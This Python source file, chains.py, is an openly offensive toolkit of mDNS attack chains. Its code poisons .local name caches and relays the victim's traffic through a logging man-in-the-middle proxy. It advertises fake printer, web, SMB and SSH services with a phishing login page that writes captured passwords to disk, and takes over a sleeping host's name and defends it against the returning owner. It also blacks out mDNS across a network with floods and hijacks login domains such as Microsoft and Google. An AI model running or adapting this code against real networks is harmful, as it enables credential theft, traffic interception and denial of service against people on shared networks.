"""
chains.py - Compound attack chains that orchestrate multiple primitives.

Chain A: Full Service MITM    - recon -> evict -> replace -> proxy
Chain B: Credential Harvest   - recon -> fake services -> capture
Chain C: Stealth Takeover     - wait for sleep -> claim name -> serve poison
Chain D: Network-Wide Denial  - tc-flood + goodbye-flood + probe-deny
"""

import time
import sys
import threading
import socket
import struct
import http.server
import socketserver
import ssl
import os
import select

sys.path.insert(0, __file__.rsplit("/", 2)[0])
from mdns_core import (
    make_mdns_socket, send_mdns, recv_mdns, parse_packet,
    build_response, build_query, build_goodbye, build_probe,
    build_service_announcement, DNSPacket, QR_RESPONSE, QR_QUERY, TC_BIT,
    rdata_a, rdata_srv, rdata_txt, rdata_ptr, encode_name,
    A, AAAA, PTR, SRV, TXT, ANY, IN, CACHE_FLUSH, MDNS_ADDR, MDNS_PORT
)


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

class MitmProxy:
    """
    Minimal TCP proxy: listens on a local port, forwards to the real backend,
    logs all traffic passing through.
    """
    def __init__(self, listen_port: int, real_ip: str, real_port: int,
                 log_dir: str = "/tmp/mitm"):
        self.listen_port = listen_port
        self.real_ip = real_ip
        self.real_port = real_port
        self.log_dir = log_dir
        self.running = False
        self._server_sock = None
        os.makedirs(log_dir, exist_ok=True)

    def start(self):
        self.running = True
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self):
        self.running = False
        if self._server_sock:
            self._server_sock.close()

    def _run(self):
        self._server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_sock.bind(("0.0.0.0", self.listen_port))
        self._server_sock.listen(16)
        self._server_sock.settimeout(1.0)
        conn_id = 0

        print(f"  [proxy] Listening on :{self.listen_port} -> {self.real_ip}:{self.real_port}")

        while self.running:
            try:
                client, addr = self._server_sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break

            conn_id += 1
            t = threading.Thread(target=self._handle, args=(client, addr, conn_id),
                                 daemon=True)
            t.start()

    def _handle(self, client: socket.socket, addr: tuple, conn_id: int):
        logfile = os.path.join(self.log_dir, f"conn_{conn_id}_{addr[0]}_{addr[1]}.bin")
        try:
            backend = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            backend.connect((self.real_ip, self.real_port))
        except Exception as e:
            print(f"  [proxy] Connection {conn_id}: backend connect failed: {e}")
            client.close()
            return

        print(f"  [proxy] Connection {conn_id}: {addr[0]}:{addr[1]} -> {self.real_ip}:{self.real_port}")

        with open(logfile, "wb") as f:
            try:
                while self.running:
                    readable, _, _ = select.select([client, backend], [], [], 1.0)
                    for sock in readable:
                        data = sock.recv(8192)
                        if not data:
                            raise ConnectionError("closed")
                        if sock is client:
                            direction = b">>> CLIENT->SERVER >>>\n"
                            backend.sendall(data)
                        else:
                            direction = b"<<< SERVER->CLIENT <<<\n"
                            client.sendall(data)
                        f.write(direction + data + b"\n---\n")
                        f.flush()
            except Exception:
                pass

        client.close()
        backend.close()
        fsize = os.path.getsize(logfile)
        print(f"  [proxy] Connection {conn_id} closed. Captured {fsize} bytes -> {logfile}")


class CredentialServer:
    """
    Minimal HTTP server that presents a login form and captures credentials.
    Used by Chain B for fake service credential harvesting.
    """
    def __init__(self, port: int, service_name: str = "Service",
                 log_dir: str = "/tmp/creds"):
        self.port = port
        self.service_name = service_name
        self.log_dir = log_dir
        self.running = False
        os.makedirs(log_dir, exist_ok=True)

    def start(self):
        self.running = True
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self):
        self.running = False

    def _run(self):
        srv = self
        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass  # suppress default logging

            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                page = f"""<!DOCTYPE html>
<html><head><title>{srv.service_name} - Login Required</title>
<style>
body {{ font-family: -apple-system, sans-serif; display: flex;
       justify-content: center; align-items: center; height: 100vh;
       background: #f5f5f7; margin: 0; }}
.box {{ background: white; padding: 40px; border-radius: 12px;
        box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 320px; }}
h2 {{ margin-top: 0; color: #333; }}
input {{ width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ddd;
         border-radius: 6px; box-sizing: border-box; }}
button {{ width: 100%; padding: 10px; background: #007aff; color: white;
          border: none; border-radius: 6px; cursor: pointer; font-size: 16px; }}
</style></head><body>
<div class="box">
<h2>{srv.service_name}</h2>
<p>Authentication required to continue.</p>
<form method="POST" action="/login">
<input name="username" placeholder="Username" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form></div></body></html>"""
                self.wfile.write(page.encode())

            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode("utf-8", errors="replace")
                src = self.client_address[0]
                timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

                # Log credentials
                logfile = os.path.join(srv.log_dir, "captured.txt")
                entry = f"[{timestamp}] {src} -> {body}\n"
                with open(logfile, "a") as f:
                    f.write(entry)
                print(f"  [creds] CAPTURED from {src}: {body}")

                # Send a plausible error
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(b"<html><body><p>Authentication failed. Please try again.</p>"
                                 b"<script>setTimeout(function(){window.location='/'},2000)</script>"
                                 b"</body></html>")

        server = http.server.HTTPServer(("0.0.0.0", self.port), Handler)
        server.timeout = 1.0
        print(f"  [creds] Credential capture server on :{self.port}")
        while self.running:
            server.handle_request()
        server.server_close()


# ─────────────────────────────────────────────────────────────────────────────
# Chain A: Full Service MITM
# ─────────────────────────────────────────────────────────────────────────────

def chain_a(target_name: str, target_ip: str, our_ip: str,
            target_port: int = 80, iface: str | None = None,
            duration: int = 120, log_dir: str = "/tmp/mitm"):
    """
    Chain A: Full Service MITM

    1. Recon  - passively confirm target is alive and learn its records
    2. Evict  - cache-flush the target's A record
    3. Replace - inject our IP for the target's hostname
    4. Proxy  - forward traffic to real host while intercepting

    All traffic between clients and the target passes through us and is logged.
    """
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║           Chain A: Full Service MITM                        ║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print(f"  Target:  {target_name} ({target_ip}:{target_port})")
    print(f"  Our IP:  {our_ip}")
    print(f"  Log dir: {log_dir}")
    print()

    sock = make_mdns_socket(iface)

    # ── Step 1: Recon ────────────────────────────────────────────────────
    print("[1/4] Reconnaissance - confirming target is alive...")
    query = build_query(target_name, A)
    send_mdns(sock, query)
    confirmed = False
    deadline = time.time() + 5
    while time.time() < deadline:
        result = recv_mdns(sock, timeout=1.0)
        if result is None:
            continue
        data, (src_ip, _) = result
        pkt = parse_packet(data)
        if not pkt or not pkt["is_response"]:
            continue
        for rec in pkt["answers"] + pkt["additional"]:
            if rec["name"].lower() == target_name.lower() and rec["type_int"] == A:
                if "rdata" in rec:
                    print(f"       Confirmed: {target_name} -> {rec['rdata']}")
                    confirmed = True
                    break
        if confirmed:
            break

    if not confirmed:
        print(f"       Target not found via mDNS query, proceeding anyway (may be cached)")

    # ── Step 2: Start proxy BEFORE taking over ───────────────────────────
    print(f"\n[2/4] Starting MITM proxy (:{target_port} -> {target_ip}:{target_port})...")
    proxy = MitmProxy(target_port, target_ip, target_port, log_dir)
    proxy.start()
    time.sleep(0.5)

    # ── Step 3: Cache-flush takeover ─────────────────────────────────────
    print(f"\n[3/4] Cache-flush takeover: {target_name} -> {our_ip}")
    takeover = build_response(target_name, A, rdata_a(our_ip),
                              ttl=4500, cache_flush=True)
    send_mdns(sock, takeover)
    time.sleep(1)
    # Send a second announcement for reliability
    send_mdns(sock, takeover)
    print(f"       Takeover packet sent (2x). All clients should now reach us.")

    # ── Step 4: Maintain poisoning and proxy ─────────────────────────────
    print(f"\n[4/4] Maintaining poison + proxy for {duration}s...")
    print(f"       Traffic logs -> {log_dir}/")
    print(f"       Press Ctrl+C to stop\n")

    start = time.time()
    announce_interval = 20  # re-poison every 20s to maintain cache
    last_announce = time.time()
    queries_answered = 0

    try:
        while time.time() - start < duration:
            # Re-announce periodically
            if time.time() - last_announce > announce_interval:
                send_mdns(sock, takeover)
                last_announce = time.time()

            # Also respond reactively to queries for the target
            result = recv_mdns(sock, timeout=1.0)
            if result is None:
                continue
            data, (src_ip, _) = result
            pkt = parse_packet(data)
            if not pkt or pkt["is_response"]:
                continue
            for q in pkt["questions"]:
                if q["name"].lower() == target_name.lower():
                    send_mdns(sock, takeover)
                    queries_answered += 1
                    print(f"  [reactive] Query from {src_ip} -> responded with {our_ip}")
    except KeyboardInterrupt:
        pass

    elapsed = time.time() - start
    proxy.stop()
    sock.close()

    print(f"\n[*] Chain A completed. Duration: {elapsed:.0f}s")
    print(f"    Reactive responses: {queries_answered}")
    print(f"    Traffic captured in: {log_dir}/")

    # List captured files
    if os.path.isdir(log_dir):
        files = os.listdir(log_dir)
        if files:
            total = sum(os.path.getsize(os.path.join(log_dir, f)) for f in files)
            print(f"    Files: {len(files)}, Total size: {total} bytes")


# ─────────────────────────────────────────────────────────────────────────────
# Chain B: Credential Harvesting via Fake Services
# ─────────────────────────────────────────────────────────────────────────────

SERVICE_CONFIGS = {
    "printer": {
        "type": "_ipp._tcp", "port": 631,
        "txt": {"ty": "HP LaserJet Pro MFP", "pdl": "application/postscript",
                "Color": "T", "Duplex": "T", "adminurl": "http://{ip}:{port}/"},
        "cred_port": 631,
        "display": "Network Printer (IPP - captures print jobs + auth)",
    },
    "http": {
        "type": "_http._tcp", "port": 80,
        "txt": {"path": "/"},
        "cred_port": 80,
        "display": "Web Service (HTTP - login page phishing)",
    },
    "smb": {
        "type": "_smb._tcp", "port": 445,
        "txt": {},
        "cred_port": 8445,
        "display": "File Share (SMB - credential capture)",
    },
    "ssh": {
        "type": "_ssh._tcp", "port": 22,
        "txt": {},
        "cred_port": 2222,
        "display": "SSH Server (credential capture)",
    },
}


def chain_b(our_ip: str, hostname: str = "services",
            services: list[str] | None = None,
            iface: str | None = None, duration: int = 300,
            log_dir: str = "/tmp/creds"):
    """
    Chain B: Credential Harvesting via Fake Services

    1. Recon  - passively observe what service types exist on the network
    2. Poison - advertise fake services of each type
    3. Serve  - run credential capture servers on each port
    4. Persist - use high TTLs so services survive in caches

    Harvested credentials are logged to disk.
    """
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║       Chain B: Credential Harvesting via Fake Services      ║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print(f"  Our IP:   {our_ip}")
    print(f"  Hostname: {hostname}.local.")
    print(f"  Log dir:  {log_dir}")
    print()

    if services is None:
        services = list(SERVICE_CONFIGS.keys())

    sock = make_mdns_socket(iface)

    # ── Step 1: Recon (quick) ────────────────────────────────────────────
    print("[1/4] Quick recon - browsing existing services...")
    query = build_query("_services._dns-sd._udp.local.", PTR)
    send_mdns(sock, query)
    found_types = set()
    deadline = time.time() + 3
    while time.time() < deadline:
        result = recv_mdns(sock, timeout=1.0)
        if result is None:
            continue
        data, _ = result
        pkt = parse_packet(data)
        if pkt:
            for rec in pkt["answers"]:
                if rec["type_int"] == PTR and "rdata" in rec:
                    found_types.add(rec["rdata"])

    if found_types:
        print(f"       Found service types: {', '.join(sorted(found_types))}")
    else:
        print(f"       No service types discovered (cache may be warm)")

    # ── Step 2: Start credential capture servers ─────────────────────────
    print(f"\n[2/4] Starting credential capture servers...")
    cred_servers = []
    for svc_name in services:
        if svc_name not in SERVICE_CONFIGS:
            continue
        cfg = SERVICE_CONFIGS[svc_name]
        cred_port = cfg["cred_port"]
        # Only start HTTP-based capture for services we can actually serve
        if svc_name in ("http", "printer"):
            srv = CredentialServer(cred_port, f"{hostname} {svc_name.title()}", log_dir)
            srv.start()
            cred_servers.append(srv)
            print(f"       [{svc_name}] Credential server on :{cred_port}")

    # ── Step 3: Advertise fake services ──────────────────────────────────
    print(f"\n[3/4] Advertising {len(services)} fake services...")
    announcements = []
    for svc_name in services:
        if svc_name not in SERVICE_CONFIGS:
            continue
        cfg = SERVICE_CONFIGS[svc_name]
        instance_name = f"{hostname.title()} {svc_name.title()}"
        txt = dict(cfg["txt"])
        # Template in our IP where needed
        for k, v in txt.items():
            if isinstance(v, str) and "{ip}" in v:
                txt[k] = v.format(ip=our_ip, port=cfg["port"])

        pkt_data = build_service_announcement(
            cfg["type"], instance_name, hostname, our_ip,
            cfg["port"], txt, ttl=4500)
        announcements.append((svc_name, instance_name, pkt_data))
        print(f"       [{svc_name}] {instance_name}.{cfg['type']}.local. -> {our_ip}:{cfg['port']}")

    # ── Step 4: Maintain advertisements and wait ─────────────────────────
    print(f"\n[4/4] Maintaining services for {duration}s (Ctrl+C to stop)...")
    print(f"       Credentials will be logged to {log_dir}/captured.txt\n")

    start = time.time()
    cycle = 0
    try:
        while time.time() - start < duration:
            for svc_name, instance_name, pkt_data in announcements:
                send_mdns(sock, pkt_data)
                time.sleep(0.1)
            cycle += 1

            # Also respond to browse queries reactively
            deadline = time.time() + 15
            while time.time() < deadline:
                result = recv_mdns(sock, timeout=1.0)
                if result is None:
                    continue
                data, (src_ip, _) = result
                pkt = parse_packet(data)
                if not pkt or pkt["is_response"]:
                    continue
                for q in pkt["questions"]:
                    qname = q["name"].lower().rstrip(".")
                    for svc_name, instance_name, pkt_data in announcements:
                        cfg = SERVICE_CONFIGS.get(svc_name, {})
                        stype = cfg.get("type", "")
                        if qname == f"{stype}.local" or qname == "_services._dns-sd._udp.local":
                            send_mdns(sock, pkt_data)
                            print(f"  [reactive] {src_ip} browsing {q['name']} -> sent {instance_name}")
                            break

            if cycle % 4 == 0:
                # Check for captured creds
                cred_file = os.path.join(log_dir, "captured.txt")
                if os.path.exists(cred_file):
                    count = sum(1 for _ in open(cred_file))
                    print(f"  [status] {count} credential(s) captured so far")
    except KeyboardInterrupt:
        pass

    for srv in cred_servers:
        srv.stop()
    sock.close()

    elapsed = time.time() - start
    print(f"\n[*] Chain B completed. Duration: {elapsed:.0f}s")

    cred_file = os.path.join(log_dir, "captured.txt")
    if os.path.exists(cred_file):
        print(f"    Captured credentials:")
        with open(cred_file) as f:
            for line in f:
                print(f"      {line.rstrip()}")
    else:
        print(f"    No credentials captured (no users connected to fake services)")


# ─────────────────────────────────────────────────────────────────────────────
# Chain C: Targeted Stealth Takeover
# ─────────────────────────────────────────────────────────────────────────────

def chain_c(target_name: str, our_ip: str, iface: str | None = None,
            duration: int = 300, wait_for_sleep: bool = True):
    """
    Chain C: Targeted Stealth Takeover

    1. Wait   - monitor for goodbye packets from target (indicates sleep/shutdown)
    2. Claim  - once offline, claim the hostname via probing
    3. Serve  - respond to all queries for the name with our IP (unicast + multicast)
    4. Defend - when victim wakes, win the conflict tiebreak (our IP must be higher)

    This is a stealth attack: we only take over when the victim goes offline,
    so there's no visible conflict until the victim returns.
    """
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║         Chain C: Targeted Stealth Takeover                  ║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print(f"  Target: {target_name}")
    print(f"  Our IP: {our_ip} (must be lexicographically > target IP)")
    print()

    sock = make_mdns_socket(iface)
    target = target_name.lower().rstrip(".") + "."
    target_ip = None

    # ── Step 1: Monitor for target going offline ─────────────────────────
    if wait_for_sleep:
        print("[1/4] Monitoring for target going offline (goodbye packets)...")
        print("       Waiting for goodbye or just silence...\n")

        # First, find the target's current IP
        query = build_query(target_name, A)
        send_mdns(sock, query)
        deadline = time.time() + 5
        while time.time() < deadline:
            result = recv_mdns(sock, timeout=1.0)
            if result is None:
                continue
            data, _ = result
            pkt = parse_packet(data)
            if not pkt:
                continue
            for rec in pkt["answers"] + pkt["additional"]:
                if rec["name"].lower() == target and rec["type_int"] == A and "rdata" in rec:
                    target_ip = rec["rdata"]
                    print(f"       Current: {target_name} -> {target_ip}")
                    break
            if target_ip:
                break

        if not target_ip:
            print("       Could not determine target's current IP. Proceeding anyway.")

        # Now wait for goodbye or silence
        print("       Waiting for target to go offline...")
        offline = False
        while not offline:
            result = recv_mdns(sock, timeout=2.0)
            if result is None:
                # No traffic at all - could be offline, verify with a query
                send_mdns(sock, query)
                result2 = recv_mdns(sock, timeout=3.0)
                if result2 is None:
                    print("       Target not responding to queries - likely offline!")
                    offline = True
                else:
                    data, _ = result2
                    pkt = parse_packet(data)
                    if pkt:
                        responded = False
                        for rec in pkt["answers"]:
                            if rec["name"].lower() == target:
                                responded = True
                        if not responded:
                            offline = True
                            print("       No response to direct query - target offline!")
                continue

            data, (src_ip, _) = result
            pkt = parse_packet(data)
            if not pkt:
                continue

            # Check for goodbye
            for rec in pkt["answers"]:
                if rec["name"].lower() == target and rec["ttl"] == 0:
                    print(f"       GOODBYE detected from {src_ip} for {target_name}!")
                    offline = True
                    break
    else:
        print("[1/4] Skipping wait (--no-wait), proceeding immediately...")

    # ── Step 2: Claim the name ───────────────────────────────────────────
    print(f"\n[2/4] Claiming {target_name} -> {our_ip}")
    print("       Sending probes (3x 250ms)...")

    for i in range(3):
        probe = build_probe(target_name, A, rdata_a(our_ip))
        send_mdns(sock, probe)
        time.sleep(0.25)

    # Check for counter-probes
    time.sleep(0.5)
    result = recv_mdns(sock, timeout=1.0)
    conflict = False
    if result:
        data, (src_ip, _) = result
        pkt = parse_packet(data)
        if pkt:
            for auth in pkt.get("authority", []):
                if auth["name"].lower() == target:
                    conflict = True
                    print(f"       Counter-probe from {src_ip}! Target may still be online.")

    if not conflict:
        print("       No counter-probes. Name is ours.")

    # ── Step 3: Announce and serve ───────────────────────────────────────
    print(f"\n[3/4] Announcing {target_name} -> {our_ip}")
    announcement = build_response(target_name, A, rdata_a(our_ip),
                                  ttl=120, cache_flush=True)
    send_mdns(sock, announcement)
    time.sleep(1)
    send_mdns(sock, announcement)

    # ── Step 4: Maintain and defend ──────────────────────────────────────
    print(f"\n[4/4] Maintaining ownership for {duration}s (Ctrl+C to stop)")
    print(f"       Defending against returning victim...\n")

    start = time.time()
    defenses = 0
    queries_answered = 0

    try:
        while time.time() - start < duration:
            # Re-announce every 30s
            if int(time.time() - start) % 30 == 0:
                send_mdns(sock, announcement)

            result = recv_mdns(sock, timeout=1.0)
            if result is None:
                continue
            data, (src_ip, _) = result
            pkt = parse_packet(data)
            if not pkt:
                continue

            # Respond to queries
            if not pkt["is_response"]:
                for q in pkt["questions"]:
                    if q["name"].lower() == target:
                        send_mdns(sock, announcement)
                        queries_answered += 1
                        print(f"  [query] {src_ip} asked for {target_name} -> responded")

                # Defend against returning victim's probes
                for auth in pkt.get("authority", []):
                    if auth["name"].lower() == target:
                        send_mdns(sock, announcement)
                        defenses += 1
                        print(f"  [DEFEND] Victim probe from {src_ip} -> re-asserted our claim!")

            # If victim sends a response reclaiming the name, conflict it
            if pkt["is_response"]:
                for rec in pkt["answers"]:
                    if (rec["name"].lower() == target and rec["type_int"] == A
                            and "rdata" in rec and rec["rdata"] != our_ip):
                        send_mdns(sock, announcement)
                        defenses += 1
                        print(f"  [DEFEND] Victim announced {rec['rdata']} -> re-asserted {our_ip}!")
    except KeyboardInterrupt:
        pass

    sock.close()
    elapsed = time.time() - start
    print(f"\n[*] Chain C completed. Duration: {elapsed:.0f}s")
    print(f"    Queries answered: {queries_answered}")
    print(f"    Defenses against victim: {defenses}")


# ─────────────────────────────────────────────────────────────────────────────
# Chain D: Network-Wide Service Denial
# ─────────────────────────────────────────────────────────────────────────────

def chain_d(our_ip: str, iface: str | None = None, duration: int = 60,
            known_records: list[tuple[str, str]] | None = None):
    """
    Chain D: Network-Wide Service Denial

    Simultaneously runs three attack primitives to create a complete mDNS blackout:

    1. TC-flood   - suppress all mDNS responses (responders keep deferring)
    2. Goodbye    - flush all known cached records
    3. Probe-deny - prevent any re-registration

    The result: no host on the network can discover any service or resolve
    any .local name for the duration of the attack.
    """
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║       Chain D: Network-Wide Service Denial                  ║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print(f"  Duration: {duration}s")
    print()

    # ── Step 0: Quick recon to find records to goodbye ───────────────────
    print("[0/3] Quick recon to find records to evict...")
    sock = make_mdns_socket(iface)
    records_to_kill: list[tuple[str, str]] = []  # (name, ip)

    if known_records:
        records_to_kill = list(known_records)
    else:
        # Send queries for common service types + general browsing
        for qname in ["_services._dns-sd._udp.local.", "_ipp._tcp.local.",
                       "_http._tcp.local.", "_ssh._tcp.local."]:
            send_mdns(sock, build_query(qname, PTR))
        time.sleep(0.5)

        deadline = time.time() + 4
        seen_hosts = set()
        while time.time() < deadline:
            result = recv_mdns(sock, timeout=1.0)
            if result is None:
                continue
            data, (src_ip, _) = result
            pkt = parse_packet(data)
            if not pkt:
                continue
            for section in ("answers", "additional"):
                for rec in pkt[section]:
                    if rec["type_int"] == A and "rdata" in rec:
                        key = (rec["name"], rec["rdata"])
                        if key not in seen_hosts:
                            records_to_kill.append(key)
                            seen_hosts.add(key)

    sock.close()

    if records_to_kill:
        print(f"       Found {len(records_to_kill)} A records to evict:")
        for name, ip in records_to_kill:
            print(f"         {name} -> {ip}")
    else:
        print("       No A records discovered (will still run TC-flood + probe-deny)")

    # ── Launch all three attacks in parallel threads ──────────────────────
    stop_event = threading.Event()

    def tc_flood_thread():
        sock = make_mdns_socket(iface)
        pkt = DNSPacket(tx_id=0, flags=QR_QUERY | TC_BIT)
        pkt.add_question("_services._dns-sd._udp.local.", PTR, IN)
        # Add fake known-answers to look legitimate
        for i in range(5):
            pkt.add_answer("_services._dns-sd._udp.local.", PTR,
                           encode_name(f"_fake{i}._tcp.local."),
                           ttl=4500, rclass=IN)
        pkt_data = pkt.build()
        count = 0
        while not stop_event.is_set():
            send_mdns(sock, pkt_data)
            count += 1
            time.sleep(0.25)
        sock.close()
        print(f"  [tc-flood] Sent {count} TC packets")

    def goodbye_flood_thread():
        sock = make_mdns_socket(iface)
        count = 0
        while not stop_event.is_set():
            for name, ip in records_to_kill:
                if stop_event.is_set():
                    break
                goodbye = build_goodbye(name, A, rdata_a(ip))
                send_mdns(sock, goodbye)
                count += 1
                time.sleep(0.1)
            if not records_to_kill:
                time.sleep(1)
        sock.close()
        print(f"  [goodbye] Sent {count} goodbye packets")

    def probe_deny_thread():
        sock = make_mdns_socket(iface)
        blocked = 0
        while not stop_event.is_set():
            result = recv_mdns(sock, timeout=0.5)
            if result is None:
                continue
            data, (src_ip, _) = result
            pkt = parse_packet(data)
            if not pkt or pkt["is_response"]:
                continue
            if pkt["authority"]:
                for auth in pkt["authority"]:
                    resp = build_response(auth["name"], A, rdata_a(our_ip),
                                          ttl=120, cache_flush=True)
                    send_mdns(sock, resp)
                    blocked += 1
                    print(f"  [probe-deny] Blocked probe from {src_ip} for {auth['name']}")
        sock.close()
        print(f"  [probe-deny] Blocked {blocked} probes")

    print(f"\n[1/3] Starting TC-flood (response suppression)...")
    t1 = threading.Thread(target=tc_flood_thread, daemon=True)
    t1.start()

    print(f"[2/3] Starting goodbye flood ({len(records_to_kill)} records)...")
    t2 = threading.Thread(target=goodbye_flood_thread, daemon=True)
    t2.start()

    print(f"[3/3] Starting probe denial...")
    t3 = threading.Thread(target=probe_deny_thread, daemon=True)
    t3.start()

    print(f"\n[*] All three attacks running. Network mDNS is blacked out.")
    print(f"    Duration: {duration}s (Ctrl+C to stop)\n")

    try:
        start = time.time()
        while time.time() - start < duration:
            time.sleep(1)
    except KeyboardInterrupt:
        pass

    stop_event.set()
    t1.join(timeout=3)
    t2.join(timeout=3)
    t3.join(timeout=3)

    print(f"\n[*] Chain D completed. Network mDNS denial for {duration}s.")


# ─────────────────────────────────────────────────────────────────────────────
# Chain E: Global Name Hijack (requires DNS disruption - partial impl)
# ─────────────────────────────────────────────────────────────────────────────

def chain_e(our_ip: str, domains: list[str] | None = None,
            iface: str | None = None, duration: int = 120):
    """
    Chain E: Outage-Triggered Global Name Hijack (mDNS portion only)

    When upstream DNS is unavailable, some resolvers fall back to mDNS for
    global names. This attack responds to mDNS queries for global domains.

    NOTE: This chain only implements the mDNS responder side. Disrupting
    upstream DNS (ARP spoofing the gateway, deauth, etc.) is out of scope
    and must be done separately.
    """
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║      Chain E: Global Name Hijack (mDNS responder)          ║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print(f"  Our IP:  {our_ip}")
    print(f"  NOTE: You must separately disrupt upstream DNS for this to work")
    print()

    if domains is None:
        domains = [
            "www.google.com.", "login.microsoftonline.com.",
            "accounts.google.com.", "imap.gmail.com.",
            "outlook.office365.com.", "github.com.",
            "mail.google.com.", "drive.google.com.",
        ]

    sock = make_mdns_socket(iface)
    print(f"[*] Listening for mDNS queries for global domains...")
    print(f"    Monitoring {len(domains)} domains")
    print(f"    Will respond with: {our_ip}")
    print(f"    Duration: {duration}s\n")

    # Normalize
    domain_set = set(d.lower().rstrip(".") + "." for d in domains)

    start = time.time()
    responses = 0

    try:
        while time.time() - start < duration:
            result = recv_mdns(sock, timeout=1.0)
            if result is None:
                continue
            data, (src_ip, _) = result
            pkt = parse_packet(data)
            if not pkt or pkt["is_response"]:
                continue

            for q in pkt["questions"]:
                qname = q["name"].lower()
                # Respond to any query for a monitored domain
                # Also respond to wildcard/any queries
                if qname in domain_set or (not qname.endswith(".local.") and q["type_int"] in (A, AAAA, ANY)):
                    resp = build_response(q["name"], A, rdata_a(our_ip),
                                          ttl=300, cache_flush=False)
                    send_mdns(sock, resp)
                    responses += 1
                    print(f"  [{responses}] {src_ip} queried {q['name']} -> responded with {our_ip}")
    except KeyboardInterrupt:
        pass

    sock.close()
    print(f"\n[*] Chain E completed. Responded to {responses} global name queries.")
